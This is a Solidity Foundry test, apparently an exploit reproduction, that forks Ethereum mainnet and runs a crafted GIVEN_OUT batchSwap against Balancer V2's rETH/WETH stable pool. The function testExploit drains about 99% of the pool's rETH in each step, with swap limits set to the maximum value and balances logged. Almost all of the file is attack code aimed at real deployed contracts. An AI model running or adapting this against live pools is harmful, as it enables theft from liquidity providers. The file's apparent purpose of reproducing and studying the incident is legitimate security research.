// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../basetest.sol";


interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        address[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external returns (int256[] memory assetDeltas);

    function getPoolTokens(bytes32 poolId)
    external
    view
    returns (
        address[] memory tokens,
        uint256[] memory balances,
        uint256 lastChangeBlock
    );
}

contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    address constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 constant BLOCK_NUMBER = 23741150;
    address constant B_rETH_STABLE_Pool = 0x1E19CF2D73a72Ef1332C882F20534B6519Be0276; // [rETH, WETH]
    bytes32 constant POOL_ID = 0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112;


    function setUp() public {
        vm.createSelectFork("mainnet", BLOCK_NUMBER);
    }

    /* 入口：打印攻击前余额 */
    function testExploit() public balanceLog{
        (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock) = vault.getPoolTokens(POOL_ID);

        console.log("tokens: ");
        for(uint256 i = 0; i < tokens.length; i++) {
            console.log("[%s]:", i, tokens[i]);
        }
        console.log("balances: ");
        for(uint256 i = 0; i < balances.length; i++) {
            console.log("[%s]:", i, balances[i]);
        }
        console.log("lastChangeBlock: ", lastChangeBlock);


        uint256 bal_rETH0 = balances[0]; // 目标是让它在 16 - 1 之间来回swap
        uint256 bal_WETH0 = balances[1];


        IBalancerVault.BatchSwapStep[] memory swaps = _buildSwaps(bal_rETH0, bal_WETH0);
        address[] memory assets = _buildAssets();
        IBalancerVault.FundManagement memory funds = _buildFunds();
        int256[] memory limits = _buildLimits();


        int256[] memory assetDeltas = vault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            swaps,
            assets,
            funds,
            limits,
            1892156007
        );

        console.log("Asset Deltas:");
        console.logInt(assetDeltas[0]);
        console.logInt(assetDeltas[1]);
    }

    function _buildSwaps(uint256 bal_rETH0, uint256 bal_WETH0) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {

        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](2);

        uint256 bal_rETH = bal_rETH0;
        uint256 i = 0 ;
        uint256 rate = 99;
        while(i < 2){
            swaps[i] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, bal_rETH * rate / 100 - 1, "");
            i = i + 1;
            bal_rETH -= bal_rETH * rate / 100;
        }


        return swaps;
    }

    function _buildAssets() internal pure returns (address[] memory) {
        address[] memory assets = new address[](2);
        assets[0] = rETH;
        assets[1] = WETH;
        return assets;
    }


    function _buildFunds() internal view returns (IBalancerVault.FundManagement memory) {
        return IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: true,
            recipient: payable(address(this)),
            toInternalBalance: true
        });
    }

    function _buildLimits() internal pure returns (int256[] memory) {
        int256[] memory limits = new int256[](2);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        return limits;
    }
}